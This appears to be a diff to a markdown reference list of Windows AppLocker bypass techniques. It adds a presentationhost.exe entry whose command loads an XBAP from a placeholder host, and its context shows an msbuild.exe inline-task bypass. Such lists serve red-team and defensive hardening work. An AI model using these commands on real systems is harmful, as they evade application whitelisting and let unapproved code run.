@@ -7,9 +7,9 @@ Please contribute and do point out errors or resources I have forgotten.
 
 `msbuild.exe pshell.xml`
 
-Requires admin: No
+Requires admin: No  
 Windows binary: Yes  
-Bypasses AppLocker Default rules: Yes  
+Bypasses AppLocker Default rules: Yes    
 
 Notes:
 
@@ -35,3 +35,17 @@ Notes:
 Links:  
 https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_4
 https://oddvar.moe/2017/12/21/harden-windows-with-applocker-based-on-case-study-part-2/
+
+## 3. Presentationhost.exe
+
+`presentationhost.exe file:///x.x.x.x/bypass.xbap`
+
+Requires admin: No  
+Windows binary: Yes  
+Bypasses AppLocker Default rules: Yes  
+
+Notes:
+Must be run from the file system, the xbap can't request full permissions when loaded over HTTP/FTP
+
+Links:  
+https://medium.com/@jpg.inc.au/applocker-bypass-presentationhost-exe-8c87b2354cd4
